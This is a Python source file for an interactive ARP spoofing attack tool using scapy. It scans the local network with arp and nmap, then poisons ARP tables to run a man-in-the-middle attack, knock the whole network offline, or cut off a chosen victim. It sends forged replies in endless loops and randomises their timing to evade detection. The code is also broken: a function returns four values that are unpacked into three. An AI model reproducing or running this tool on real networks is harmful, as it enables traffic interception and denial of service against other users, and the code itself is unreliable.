import subprocess, time

from scapy.layers.l2 import ARP
from scapy.sendrecv import send
import uuid
from victim import Victim
from attacker import Attacker
from network import Network
from color import Color #used to output to the terminals with colors
from random import randint
from random import seed

def initialize():
    Color.pl("{?} Doing pings to discover the router")
    time.sleep(2)

    subprocess.run(["ip", "neigh", "flush", "all"],shell=True) #clear arp table
    subprocess.run(["ping", "8.8.8.8", "-c", "1"]) #used to make sure the router has been added to the ARP table
    time.sleep(2)
    command = "arp -a"# neighbors table (ARP)
    out = str(subprocess.check_output(command, shell=True))
    
    commandOutput=out.split('\\r\\n')
    routerIP = commandOutput[3].split()[0]
    routerMAC = commandOutput[3].split()[1]
    attackerIP = commandOutput[1].split()[1]
    attackerMAC = hex(uuid.getnode())
    i=3
    while (i<len(commandOutput)):
        if commandOutput[i].split()[1]=='ff-ff-ff-ff-ff-ff':
            broadcastIP = commandOutput[i].split()[0]
            i=len(commandOutput)
        i+=1
            

    command = "nmap -sn "+ routerIP +"/24" # discover users connected to router
    commandOutput = str(subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT))
    connectedDevices = commandOutput.split('\\r\\n') #remove first element since it is the router
    victimList = [] # list we are going to use and popsulate it with possible victims
    if len(connectedDevices)>5:
        for i in range(4, len(connectedDevices)-6, 3):
            mac = connectedDevices[i+2].split()[2]
            ip = connectedDevices[i].split()[4]
            if ip != attackerIP:
                print(ip, mac)
                victimList.append(Victim([ip, mac]))
    network = Network([routerIP, routerMAC, broadcastIP])
    attacker = Attacker([attackerIP, attackerMAC])
    return (network, attacker, victimList,broadcastIP)

#generate random MAC address
def generateMAC(seed_value):
    mac = ""
    seed(seed_value)
    for i in range(6):
        char1 = hex(randint(0, 15))[2:] #remove 0x from the beginnign of the hex
        char2 = hex(randint(0, 15))[2:]
        mac += char1 + char2 + ":"
    return mac[:-1] #remove trailing ":"


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    takedown=False
    specific=False
    # seed(655)
    (network, attacker, victimsList) = initialize()
    Color.pl("{+} " + network.toString())
    Color.pl("{+} " + attacker.toString())
    for e in victimsList:
        Color.pl("{!} " + e.toString())

    # select type of attack
    while(True):
        Color.pl("{?} What type of ARP attack do you want to perform? \n {C}Man-in-the-middle[1] {W}or {O}Take down the network![2] {W}or {P}{D}Attack specific victim[3]?)")
        selection = input()
        routerIP=network.ip
        # attacking down the whole network by specifying a non existent MAC
        if selection.lower() == "2":
            takedown = True
            ip=network.broadcastIP
            mac=generateMAC(randint(0, 655)) #random
            break
        # attacking a specific target and not allowing it to connect to the internet by specifying a non existent MAC
        elif selection.lower()=="3":
            specific=True
            mac=generateMAC(randint(0, 655)) #random
            break
        # Man in the Middle needs handling that is done later
        elif selection.lower() == "1":
            break
        else:
            Color.pl("{!} Invalid Input")

    while(not takedown):
        Color.pl("{?} Do you want to enter the target manually? (y or n)")
        selection = input().lower()
        if selection.lower() == "y":
            Color.pl("{+} Enter target IP address ")
            ip = input().strip()
            if not specific:
                Color.pl("{+} Enter target MAC address ")
                mac = input().strip()
            break
        elif selection.lower() == "n":
            for i in range(len(victimsList)):
                Color.pl("{!} " + str(i) + ":   " + victimsList[i].toString())
            Color.pl("{+} Enter Index of Target")
            index = int(input())
            ip = victimsList[index].ip
            if not specific:
                mac = victimsList[index].mac
            break
        else:
            Color.pl("{!} Invalid Input")

    while(not takedown):
        Color.pl("{?} Do you want to enter the router IP manually? (y or n)")
        selection = input().lower()
        if selection.lower() == "y":
            Color.pl("{+} Enter router IP address ")
            routerIP = input().strip()
            break
        elif selection.lower() == "n":
            routerIP = network.ip
            break
        else:
            Color.pl("{!} Invalid Input")

    # printing Target IP, IP and MAC Entry that is getting changed
    Color.pl("{+} {R} Target IP: {G}" + ip)
    Color.pl("{+} {R} ARP table changed combination IP: {G}" + routerIP + "  {R} MAC: {G}" + mac)
    time.sleep(2)

    Color.pl("{+} Processing :) ")

    '''
    pdst is the ip of the target that we want to change its ARP table
    psrc is the ip in the ARP table that we want to change its associated MAC address
    hwsrc is the MAC address that we replace with in the ARP table, no value for it uses the MAC of the attacker

    Every time we send an ARP message, we also send one to change the attacker IP and MAC in order to not have 
    duplicate MAC in the ARP table 
    '''

    if (not takedown and not specific): #man in the middle needs to change ARP table for both router and target
        arp_target_router = ARP(op=2, psrc=routerIP, pdst=ip)
        arp_target_attacker = ARP(op=2, psrc=attacker.ip, pdst=ip, hwsrc=generateMAC(randint(0, 655)))
        arp_router = ARP(op=2, psrc=ip, pdst=routerIP)
        while 1:
            send(arp_target_router)
            send(arp_target_attacker)
            send(arp_router)
            time.sleep(1)
    else:
        counter=0
        while 1:
            #randomizer to evade detection
            if (counter % 5 == 0):
                op = randint(1, 2)
                s = randint(0, 2)
            counter += 1
            # creating the arp packet using scapy
            arp = ARP(op=op, psrc=routerIP, pdst=ip, hwsrc=mac)
            send(arp)
            # lower sleep timer to make it better, victim ajusts ARP table otherwise
            time.sleep(s)
